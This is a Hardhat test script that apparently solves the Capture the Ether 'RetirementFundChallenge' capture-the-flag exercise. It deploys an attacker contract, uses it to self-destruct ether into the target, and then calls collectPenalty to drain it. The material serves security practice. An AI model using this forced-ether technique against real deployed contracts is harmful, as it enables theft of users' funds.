const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("RetirementFundChallenge", async function () {
  let contract;
  let owner;

  before(async function () {
    [owner] = await ethers.getSigners();
    contract = await (
      await ethers.getContractFactory("RetirementFundChallenge")
    ).deploy(owner.address, { value: ethers.utils.parseEther("1") });

    hackingContract = await (
      await ethers.getContractFactory("hackingRetirementFundChallenge")
    ).deploy({ value: ethers.utils.parseEther("0.5") });
  });

  it("Exploit", async function () {
    await hackingContract.destructContract(contract.address);

    await contract.collectPenalty();
  });

  after(async function () {
    expect(await contract.isComplete()).to.be.true;
  });
});
